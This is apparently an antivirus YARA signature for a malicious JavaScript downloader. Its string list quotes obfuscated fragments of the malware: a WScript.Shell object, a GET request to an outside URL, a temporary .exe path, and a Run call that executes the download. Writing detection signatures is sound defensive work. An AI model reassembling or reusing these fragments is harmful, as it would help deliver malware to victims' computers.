rule sig_20160328_dcd94098f328ab63fe11d4e893c76ee1 {
  meta:
    description = "datamaliciousorder - file 20160328_dcd94098f328ab63fe11d4e893c76ee1.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "9b4c48eb2735a1a885d389dc5a6d6c9bc1a1b08ce244ce4d2570c692a3d6c62f"

  strings:
    $s1  = "function Ciixwngvaw() {return Dcxnsgl[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"PI8kANfgCC5.exe\";};" fullword ascii
    $s2  = "Wyyhl[Aixphxczz](\"GET\", \"http://www.suansawanresort.com/n7eua\", false);" fullword ascii
    $s3  = "do {WScript[Tvxcincrqk](Uzyqx() * 11)} while (Wyyhl[\"readystate\"] < 4 );" fullword ascii
    $s4  = "var Dcxnsgl = function Fyfqvhes() {return WScript[Kvhutud](\"WScript.Shell\");}();" fullword ascii
    $s5  = "function Gcohq(Gxtwldifvu, Pbsucj){return Gxtwldifvu - Pbsucj;};" fullword ascii
    $s6  = "function Frvaxccpag() {return ((Hwjrn == true) && (Hwjrn == Fvwgvie)) ? 1 : Lstfkm;};" fullword ascii
    $s7  = "function Kgpsb(Oeafsqmbnr){Dcxnsgl[\"Run\"](Oeafsqmbnr, Lstfkm, Lstfkm);};" fullword ascii
    $s8  = "function Asdytb(Dlqmqmqdz) {var Nlyuqjvb = (1, 2, 3, 4, 5, Dlqmqmqdz); return Nlyuqjvb;};" fullword ascii
    $s9  = "var Hwjrn = false;" fullword ascii
    $s10 = "var Tzgcmhjscs = new this[\"Date\"]();" fullword ascii
    $s11 = "Hwjrn = true; " fullword ascii
    $s12 = "function Uzyqx(){return 22;};" fullword ascii
    $s13 = " while (Cmepztijh){" fullword ascii
    $s14 = "function Ibprhzzna()" fullword ascii
    $s15 = "function Jnnwubem(){return Vfpnyvkn;};" fullword ascii
    $s16 = "var Fvwgvie = false;" fullword ascii
    $s17 = "var Acgfu = false;" fullword ascii
    $s18 = "function Axzbagzqbh(){return Kvhutud;};" fullword ascii
    $s19 = "return Gcohq(Znnwyuv, Mziggcdqe);" fullword ascii
    $s20 = "Fvwgvie = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}